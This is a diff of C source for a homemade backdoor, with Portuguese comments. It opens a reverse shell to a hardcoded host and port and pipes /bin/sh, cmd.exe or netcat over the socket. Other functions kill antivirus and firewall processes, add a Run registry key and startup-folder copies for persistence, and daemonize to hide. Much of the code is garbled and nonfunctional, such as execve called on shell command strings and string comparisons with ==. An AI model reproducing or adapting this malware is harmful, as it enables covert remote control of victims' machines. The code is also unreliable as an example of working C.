@@ -17,6 +17,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
 */
 
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <signal.h>
@@ -29,7 +30,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 #include <time.h>
 #include <sys/types.h>
 #include <sys/socket.h>
-#include <X11/Xlib.h>
+//#include <X11/Xlib.h>
 
 #define remote_addr "127.0.0.1"
 #define remote_port 2222
@@ -46,13 +47,12 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
   char REMOTE_ADDR; /*remote_addr */
   int REMOTE_PORT; /* remote port */
   char commands[bytes];
-  //int novax;
   int x;
-  FILE *filecmd;
-
- // x = true; 
+  //FILE *filecmd;
 
   } Target;
+
+  int x = true;
 
 
   void
@@ -70,13 +70,13 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
   kill_antivirus()
 
   {
-     int x;
+     //int i;
      FILE *arq;
 
     arq = fopen("av.txt", "rb");
     if(arq == NULL)
         return;
-    else if(( dup2(x,0)),dup2(x,1));
+    if(( dup2(x,0)),dup2(x,1));
        execve("TASKLIST /FI 'STATUS eq RUNNING'", 0, 0);
        send(x,"Killing anti virus...\n",31,0);
        execve("TASKKILL /F /IM \\{}\\ '>> NUL'", 0, 0);
@@ -92,8 +92,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
   kill_firewall()
 
   {
-	  
-   int x;
+
    dup2(x,0);
    execve("firewall.vbs", 0, 0);
 
@@ -107,7 +106,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
   auto_copy()
 
   {
-     int x;
+
      dup2(x, 0);
 
      execve("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wopnt.exe",0,0);
@@ -119,12 +118,12 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
   copy_to_registry()
 
   {
-    int x;
+
     dup2(x, 0);
     dup2(x,1);
 
-    execve("copy /Y whopnt.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar", 0, 0);
-    execve("cp whopnt.exe /usr",NULL,NULL); /* for  linux systems, probably will failed... */
+    execve("copy /Y wopnt.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar", 0, 0);
+    execve("cp wopnt.exe /usr",NULL,NULL); /* for  linux systems, probably will failed... */
 
     return;
 
@@ -134,7 +133,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
     {
 
-    XFreeCursor; 
+    //XFreeCursor; //magic happens here
 
     pid_t pid;
 
@@ -146,7 +145,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
     if(pid > 0)
         exit(EXIT_SUCCESS);
 
-    if (setsid() < 0)
+    else (setsid() < 0);
         exit(EXIT_FAILURE);
 
         signal(SIGCHLD, SIG_IGN);
@@ -163,7 +162,6 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
         /* hidden in all the ways */
 
         sigmask(0x01);
-        //umask("7x324x12");
         chdir("/, C:\\, C:\\Windows\\System32,F:\\,G:\\,D:\\,E:\\,H:\\");
 
         }
@@ -184,68 +182,39 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
     return;
 }
-   void
+   /* void
     backdoor_connect()
 
     {
 
     int x;
     struct sockaddr_in s;
-    /* setting up the connection */
+     setting up the connection
 
      memset(s.sin_zero, '\0', sizeof s.sin_zero);
-     s.sin_family = AF_INET; /* família de protocolos */
+     s.sin_family = AF_INET;  família de protocolos
      s.sin_addr.s_addr = inet_addr(remote_addr);
      s.sin_port = htons(remote_port);
      malloc(sizeof (x));
 
-     x = socket(AF_INET, SOCK_STREAM, 0); /* create a socket */
+     x = socket(AF_INET, SOCK_STREAM, 0); /create a socket
      //while (connect == false)
      //listen(x,10);
 
-    /* sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
-                   discomment this if u think necessary... */
+    / sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
+                   discomment this if u think necessary...
      (connect(x, (struct sockaddr *)&s, sizeof(s)));
-     if (connect == 0x0)
+     if (accept == -1)
      perror("socket(SOCKET_CONNECT)connect_failed");
 
      if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
      perror("setsockopt(SO_REUSEADDR)failed");
 
-         char buf[bytes];
-    // FILE *cmd;
-       int t;
+     return;
 
-        //for(;;)
-        while((x=recv(t, buf, sizeof buf,  0) > 0)) {
-        //if(x == false)
-        // buf = "";
-         t = execl(buf,"r",0);
-         t = sizeof(buf);
-         //read(t, buf, 4096);
-        //send(x, buf, strlen(buf), 0);
-        // printf("%s",read(t,buf,4096)); //; to debug stuffs, all right for here. /
+     //listen(x,10);
 
-            if(buf == "killav")
-            {
-                kill_antivirus();
-            }
-            else if(buf == "killfw")
-            {
-                kill_firewall();
-            }
-            else if(buf == "autocp")
-            {      
-                auto_copy();
-            }
-            else
-	         	sleep(0.2);
-                return;
-            }
-
-   }
-
-  /*função para o programa rodar em background, como uma daemon
+  /função para o programa rodar em background, como uma daemon
    create reverse connection */
 
   void
@@ -253,14 +222,14 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
   {
     int  x;
-    FILE *filecmd;
+  //  FILE *filecmd;
     struct sockaddr_in s;
     int root;
     char command[bytes];
     char *window[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
     char *cmd[] = { "/bin/sh", (char *)0 };
 
-    //XFreeCursor; //magic happens here
+  //  XFreeCursor; //magic happens here
 
     pid_t pid;
 
@@ -306,13 +275,14 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      s.sin_addr.s_addr = inet_addr(remote_addr);
      s.sin_port = htons(remote_port);
      malloc(sizeof (x));
+
      x = socket(AF_INET, SOCK_STREAM, 0); /* create a socket */
 
     /* sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
                    discomment this if u think necessary... */
 
      (connect(x, (struct sockaddr *)&s, sizeof(s)));
-     if (connect == 0x00)
+     if (connect == 0x0)
      perror("socket(SOCKET_CONNECT)connect_failed");
 
      if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
@@ -321,10 +291,13 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      /* fck, now  i have power!
       made conditions here. */
      if(recv(x,command,bytes,NULL) == true)
-     //backdoor_connect();
+//     backdoor_connect();
      send(x,"\n...\n **\n ** backdoor loaded...",33,0), send(x,"\n Connected in machine \n\n",25,0);
 
-     /*handle with the impossible errors. */
+     /*handle with the impossible errors.
+
+     if(recv(x,command,bytes,0)  0);
+     perror("Connection failed:"); */
 
      if(connect == 0x0)
      perror("BREAK CONNECTION,(failure)");
@@ -333,7 +306,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
      if(recv(x,command,bytes,NULL) > 0);
 
-     XFreeCursor;
+     //XFreeCursor;
      dup2(x, 0),dup2(x, 1),dup2(x, 2);
      root = execve("/bin/sh", cmd,  window),execve("C:\\windows\\System32\\cmd.exe ", cmd, window),execve("netcat", cmd, window);
 
@@ -353,23 +326,90 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      int main(int argc, char **argv)
 
      {
+      char command[bytes], bufaux[bytes], *loc;
+      int tbuf, escolha;
+      char comandos [] = "/shell";
+      struct sockaddr_in s;
+//      background_life();
+     {
 
+        /* setting up the connection */
+
+     x = socket(AF_INET, SOCK_STREAM, 0); /* create a socket */
+
+     memset(s.sin_zero, '\0', sizeof s.sin_zero);
+     s.sin_family = AF_INET; /* família de protocolos */
+     s.sin_addr.s_addr = inet_addr(remote_addr);
+     s.sin_port = htons(remote_port);
+     malloc(sizeof (x));
+
+    /* sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
+                   discomment this if u think necessary... */
+
+     (connect(x, (struct sockaddr *)&s, sizeof(s))); {
+     if (connect == 0x0)
+     perror("socket(SOCKET_CONNECT)connect_failed");
+     }
 
      {
 
-        /* just shell... without conditions!? ok, for now */
+     if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
+     perror("setsockopt(SO_REUSEADDR)failed");
 
-         shell();
+     }
 
-                }
+     strcpy(command,"Backdoor connected");
+     strcpy(bufaux,command);
+     send(x,command,strlen(command), 0);
+
+    // Recebe ack do cli
+     tbuf = recv(x, command,bytes, 0);
+     command[tbuf]=0x00;
+    //printf(">: %s\n",buffer);
+     do
+
+     {
+
+     tbuf = recv(x,command,bytes,0);
+     command[tbuf]=0x00;
+
+     if (strncmp(command,"/",1) == 0)
+
+     {
+
+        loc = strstr(comandos,command);
+        escolha = loc - comandos;
+
+      }
+
+   switch(escolha)
+
+   {
+
+     case 2:
+
+    {
+
+     shell();
+
+              }
 
 
-
-           {
+           }
 
 
         }
 
+      while(1);
+
+    }
+
 
 
 }
+
+
+
+
+
+
